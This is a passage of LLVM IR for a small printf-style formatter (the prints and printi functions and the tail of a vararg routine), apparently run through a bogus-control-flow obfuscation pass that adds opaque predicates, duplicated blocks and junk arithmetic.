  %636 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 2
  %637 = load i8*, i8** %636, align 8
  %638 = bitcast i8* %637 to i32*
  %639 = getelementptr i8, i8* %637, i32 8
  store i8* %639, i8** %636, align 8
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %245
  %640 = load i32, i32* %246, align 4
  %641 = sext i32 %640 to i64
  %642 = inttoptr i64 %641 to i8*
  store i8* %642, i8** %11, align 8
  %643 = load i8**, i8*** %4, align 8
  %644 = load i8*, i8** %11, align 8
  %645 = icmp ne i8* %644, null
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %272
  %646 = load i32, i32* %7, align 4
  %647 = load i32, i32* %8, align 4
  %648 = call i32 @prints(i8** %258, i8* %273, i32 %646, i32 %647)
  %649 = load i32, i32* %9, align 4
  %_ = sub i32 %649, %648
  %gen = mul i32 %_, %648
  %_39 = sub i32 %649, %648
  %gen40 = mul i32 %_39, %648
  %_41 = sub i32 0, %649
  %gen42 = add i32 %_41, %648
  %_43 = shl i32 %649, %648
  %_44 = sub i32 0, %649
  %gen45 = add i32 %_44, %648
  %650 = add nsw i32 %649, %648
  store i32 %650, i32* %9, align 4
  br label %originalBB38

originalBB49alteredBB:                            ; preds = %originalBB49, %336
  %651 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 3
  %652 = load i8*, i8** %651, align 8
  %653 = getelementptr i8, i8* %652, i32 %334
  %654 = bitcast i8* %653 to i32*
  %_50 = shl i32 %334, 8
  %_51 = sub i32 0, %334
  %gen52 = add i32 %_51, 8
  %_53 = shl i32 %334, 8
  %_54 = shl i32 %334, 8
  %_55 = sub i32 %334, 8
  %gen56 = mul i32 %_55, 8
  %_57 = shl i32 %334, 8
  %655 = add i32 %334, 8
  store i32 %655, i32* %333, align 8
  br label %originalBB49

originalBB61alteredBB:                            ; preds = %originalBB61, %358
  %656 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 2
  %657 = load i8*, i8** %656, align 8
  %658 = bitcast i8* %657 to i32*
  %659 = getelementptr i8, i8* %657, i32 8
  store i8* %659, i8** %656, align 8
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %379
  %660 = load i32, i32* %380, align 4
  %661 = load i32, i32* %7, align 4
  %662 = load i32, i32* %8, align 4
  %663 = call i32 @printi(i8** %331, i32 %660, i32 16, i32 0, i32 %661, i32 %662, i32 97)
  %664 = load i32, i32* %9, align 4
  %_66 = sub i32 0, %664
  %gen67 = add i32 %_66, %663
  %_68 = shl i32 %664, %663
  %_69 = sub i32 0, %664
  %gen70 = add i32 %_69, %663
  %_71 = sub i32 0, %664
  %gen72 = add i32 %_71, %663
  %_73 = sub i32 0, %664
  %gen74 = add i32 %_73, %663
  %_75 = sub i32 0, %664
  %gen76 = add i32 %_75, %663
  %665 = add nsw i32 %664, %663
  store i32 %665, i32* %9, align 4
  br label %originalBB65

originalBB80alteredBB:                            ; preds = %originalBB80, %438
  %666 = load i8**, i8*** %4, align 8
  %667 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %668 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %667, i32 0, i32 0
  %669 = load i32, i32* %668, align 8
  %670 = icmp ule i32 %669, 40
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %489
  %671 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 3
  %672 = load i8*, i8** %671, align 8
  %673 = getelementptr i8, i8* %672, i32 %487
  %674 = bitcast i8* %673 to i32*
  %_85 = sub i32 %487, 8
  %gen86 = mul i32 %_85, 8
  %_87 = sub i32 %487, 8
  %gen88 = mul i32 %_87, 8
  %_89 = shl i32 %487, 8
  %_90 = sub i32 0, %487
  %gen91 = add i32 %_90, 8
  %_92 = shl i32 %487, 8
  %675 = add i32 %487, 8
  store i32 %675, i32* %486, align 8
  br label %originalBB84

originalBB96alteredBB:                            ; preds = %originalBB96, %529
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %547
  %676 = load i8**, i8*** %4, align 8
  %677 = load i8*, i8** %5, align 8
  %678 = load i8, i8* %677, align 1
  %679 = zext i8 %678 to i32
  call void @printchar(i8** %676, i32 %679)
  %680 = load i32, i32* %9, align 4
  %_101 = sub i32 %680, 1
  %gen102 = mul i32 %_101, 1
  %_103 = sub i32 0, %680
  %gen104 = add i32 %_103, 1
  %_105 = shl i32 %680, 1
  %_106 = sub i32 0, %680
  %gen107 = add i32 %_106, 1
  %_108 = sub i32 0, %680
  %gen109 = add i32 %_108, 1
  %_110 = sub i32 0, %680
  %gen111 = add i32 %_110, 1
  %_112 = shl i32 %680, 1
  %681 = add nsw i32 %680, 1
  store i32 %681, i32* %9, align 4
  br label %originalBB100

originalBB116alteredBB:                           ; preds = %originalBB116, %577
  %682 = load i8**, i8*** %4, align 8
  %683 = load i8*, i8** %682, align 8
  store i8 0, i8* %683, align 1
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %596
  %684 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %685 = bitcast %struct.__va_list_tag* %684 to i8*
  call void @llvm.va_end(i8* %685)
  %686 = load i32, i32* %9, align 4
  br label %originalBB120
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* @x.9
  %66 = load i32, i32* @y.10
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i32, i32* %11, align 4
  %74 = load i32, i32* %7, align 4
  %75 = sub nsw i32 %74, %73
  store i32 %75, i32* %7, align 4
  %76 = load i32, i32* @x.9
  %77 = load i32, i32* @y.10
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart215, %originalBBpart24
  %85 = load i32, i32* %8, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %105

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.9
  %90 = load i32, i32* @y.10
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %88
  store i32 48, i32* %10, align 4
  %97 = load i32, i32* @x.9
  %98 = load i32, i32* @y.10
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %105

; <label>:105:                                    ; preds = %originalBBpart219, %84
  br label %106

; <label>:106:                                    ; preds = %105, %4
  %107 = load i32, i32* %8, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %155, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %135, %110
  %112 = load i32, i32* %7, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %138

; <label>:114:                                    ; preds = %111
  %115 = load i32, i32* @x.9
  %116 = load i32, i32* @y.10
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %114
  %123 = load i8**, i8*** %5, align 8
  %124 = load i32, i32* %10, align 4
  call void @printchar(i8** %123, i32 %124)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %9, align 4
  %127 = load i32, i32* @x.9
  %128 = load i32, i32* @y.10
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart234, label %originalBB21alteredBB

originalBBpart234:                                ; preds = %originalBB21
  br label %135

; <label>:135:                                    ; preds = %originalBBpart234
  %136 = load i32, i32* %7, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %7, align 4
  br label %111

; <label>:138:                                    ; preds = %111
  %139 = load i32, i32* @x.9
  %140 = load i32, i32* @y.10
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %138
  %147 = load i32, i32* @x.9
  %148 = load i32, i32* @y.10
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %155

; <label>:155:                                    ; preds = %originalBBpart238, %106
  %156 = load i32, i32* @x.9
  %157 = load i32, i32* @y.10
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %155
  %164 = load i32, i32* @x.9
  %165 = load i32, i32* @y.10
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %172

; <label>:172:                                    ; preds = %199, %originalBBpart242
  %173 = load i32, i32* @x.9
  %174 = load i32, i32* @y.10
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %172
  %181 = load i8*, i8** %6, align 8
  %182 = load i8, i8* %181, align 1
  %183 = icmp ne i8 %182, 0
  %184 = load i32, i32* @x.9
  %185 = load i32, i32* @y.10
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %183, label %192, label %202

; <label>:192:                                    ; preds = %originalBBpart246
  %193 = load i8**, i8*** %5, align 8
  %194 = load i8*, i8** %6, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  call void @printchar(i8** %193, i32 %196)
  %197 = load i32, i32* %9, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %9, align 4
  br label %199

; <label>:199:                                    ; preds = %192
  %200 = load i8*, i8** %6, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %6, align 8
  br label %172

; <label>:202:                                    ; preds = %originalBBpart246
  %203 = load i32, i32* @x.9
  %204 = load i32, i32* @y.10
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %202
  %211 = load i32, i32* @x.9
  %212 = load i32, i32* @y.10
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %219

; <label>:219:                                    ; preds = %originalBBpart264, %originalBBpart250
  %220 = load i32, i32* %7, align 4
  %221 = icmp sgt i32 %220, 0
  br i1 %221, label %222, label %246

; <label>:222:                                    ; preds = %219
  %223 = load i8**, i8*** %5, align 8
  %224 = load i32, i32* %10, align 4
  call void @printchar(i8** %223, i32 %224)
  %225 = load i32, i32* %9, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  br label %227

; <label>:227:                                    ; preds = %222
  %228 = load i32, i32* @x.9
  %229 = load i32, i32* @y.10
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %227
  %236 = load i32, i32* %7, align 4
  %237 = add nsw i32 %236, -1
  store i32 %237, i32* %7, align 4
  %238 = load i32, i32* @x.9
  %239 = load i32, i32* @y.10
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart264, label %originalBB52alteredBB

originalBBpart264:                                ; preds = %originalBB52
  br label %219

; <label>:246:                                    ; preds = %219
  %247 = load i32, i32* %9, align 4
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %21
  %248 = load i32, i32* %11, align 4
  %_ = sub i32 %248, 1
  %gen = mul i32 %_, 1
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %250 = load i32, i32* %11, align 4
  %251 = load i32, i32* %7, align 4
  %_7 = sub i32 0, %251
  %gen8 = add i32 %_7, %250
  %_9 = shl i32 %251, %250
  %_10 = sub i32 0, %251
  %gen11 = add i32 %_10, %250
  %_12 = sub i32 %251, %250
  %gen13 = mul i32 %_12, %250
  %252 = sub nsw i32 %251, %250
  store i32 %252, i32* %7, align 4
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %88
  store i32 48, i32* %10, align 4
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %114
  %253 = load i8**, i8*** %5, align 8
  %254 = load i32, i32* %10, align 4
  call void @printchar(i8** %253, i32 %254)
  %255 = load i32, i32* %9, align 4
  %_22 = sub i32 %255, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 %255, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %255, 1
  %_27 = sub i32 0, %255
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 0, %255
  %gen30 = add i32 %_29, 1
  %_31 = shl i32 %255, 1
  %_32 = shl i32 %255, 1
  %256 = add nsw i32 %255, 1
  store i32 %256, i32* %9, align 4
  br label %originalBB21

originalBB36alteredBB:                            ; preds = %originalBB36, %138
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %155
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %172
  %257 = load i8*, i8** %6, align 8
  %258 = load i8, i8* %257, align 1
  %259 = icmp ne i8 %258, 0
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %202
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %227
  %260 = load i32, i32* %7, align 4
  %_53 = sub i32 %260, -1
  %gen54 = mul i32 %_53, -1
  %_55 = sub i32 0, %260
  %gen56 = add i32 %_55, -1
  %_57 = sub i32 %260, -1
  %gen58 = mul i32 %_57, -1
  %_59 = sub i32 0, %260
  %gen60 = add i32 %_59, -1
  %_61 = sub i32 %260, -1
  %gen62 = mul i32 %_61, -1
  %261 = add nsw i32 %260, -1
  store i32 %261, i32* %7, align 4
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %65

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.11
  %43 = load i32, i32* @y.12
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %50, align 1
  %51 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %51, align 1
  %52 = load i8**, i8*** %17, align 8
  %53 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %22, align 4
  %56 = call i32 @prints(i8** %52, i8* %53, i32 %54, i32 %55)
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* @x.11
  %58 = load i32, i32* @y.12
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %150

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* %20, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %77

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* %19, align 4
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %71, label %77

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* %18, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  store i32 1, i32* %27, align 4
  %75 = load i32, i32* %18, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %29, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %71, %68, %65
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %25, align 8
  %81 = load i8*, i8** %25, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart227, %77
  %83 = load i32, i32* %29, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %122

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* %29, align 4
  %87 = load i32, i32* %19, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %26, align 4
  %89 = load i32, i32* %26, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %97

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %23, align 4
  %93 = sub nsw i32 %92, 48
  %94 = sub nsw i32 %93, 10
  %95 = load i32, i32* %26, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %26, align 4
  br label %97

; <label>:97:                                     ; preds = %91, %85
  %98 = load i32, i32* @x.11
  %99 = load i32, i32* @y.12
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %26, align 4
  %107 = add nsw i32 %106, 48
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** %25, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 -1
  store i8* %110, i8** %25, align 8
  store i8 %108, i8* %110, align 1
  %111 = load i32, i32* %19, align 4
  %112 = load i32, i32* %29, align 4
  %113 = udiv i32 %112, %111
  store i32 %113, i32* %29, align 4
  %114 = load i32, i32* @x.11
  %115 = load i32, i32* @y.12
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart227, label %originalBB6alteredBB

originalBBpart227:                                ; preds = %originalBB6
  br label %82

; <label>:122:                                    ; preds = %82
  %123 = load i32, i32* %27, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %142

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %21, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* %22, align 4
  %130 = and i32 %129, 2
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %138

; <label>:132:                                    ; preds = %128
  %133 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %133, i32 45)
  %134 = load i32, i32* %28, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %28, align 4
  %136 = load i32, i32* %21, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %21, align 4
  br label %141

; <label>:138:                                    ; preds = %128, %125
  %139 = load i8*, i8** %25, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 -1
  store i8* %140, i8** %25, align 8
  store i8 45, i8* %140, align 1
  br label %141

; <label>:141:                                    ; preds = %138, %132
  br label %142

; <label>:142:                                    ; preds = %141, %122
  %143 = load i32, i32* %28, align 4
  %144 = load i8**, i8*** %17, align 8
  %145 = load i8*, i8** %25, align 8
  %146 = load i32, i32* %21, align 4
  %147 = load i32, i32* %22, align 4
  %148 = call i32 @prints(i8** %144, i8* %145, i32 %146, i32 %147)
  %149 = add nsw i32 %143, %148
  store i32 %149, i32* %16, align 4
  br label %150

; <label>:150:                                    ; preds = %142, %originalBBpart24
  %151 = load i32, i32* %16, align 4
  ret i32 %151

originalBBalteredBB:                              ; preds = %originalBB, %7
  %152 = alloca i32, align 4
  %153 = alloca i8**, align 8
  %154 = alloca i32, align 4
  %155 = alloca i32, align 4
  %156 = alloca i32, align 4
  %157 = alloca i32, align 4
  %158 = alloca i32, align 4
  %159 = alloca i32, align 4
  %160 = alloca [12 x i8], align 1
  %161 = alloca i8*, align 8
  %162 = alloca i32, align 4
  %163 = alloca i32, align 4
  %164 = alloca i32, align 4
  %165 = alloca i32, align 4
  store i8** %0, i8*** %153, align 8
  store i32 %1, i32* %154, align 4
  store i32 %2, i32* %155, align 4
  store i32 %3, i32* %156, align 4
  store i32 %4, i32* %157, align 4
  store i32 %5, i32* %158, align 4
  store i32 %6, i32* %159, align 4
  store i32 0, i32* %163, align 4
  store i32 0, i32* %164, align 4
  %166 = load i32, i32* %154, align 4
  store i32 %166, i32* %165, align 4
  %167 = load i32, i32* %154, align 4
  %168 = icmp eq i32 %167, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %169 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %169, align 1
  %170 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %170, align 1
  %171 = load i8**, i8*** %17, align 8
  %172 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %173 = load i32, i32* %21, align 4
  %174 = load i32, i32* %22, align 4
  %175 = call i32 @prints(i8** %171, i8* %172, i32 %173, i32 %174)
  store i32 %175, i32* %16, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %176 = load i32, i32* %26, align 4
  %_ = sub i32 %176, 48
  %gen = mul i32 %_, 48
  %_7 = sub i32 0, %176
  %gen8 = add i32 %_7, 48
  %_9 = shl i32 %176, 48
  %_10 = sub i32 0, %176
  %gen11 = add i32 %_10, 48
  %_12 = sub i32 %176, 48
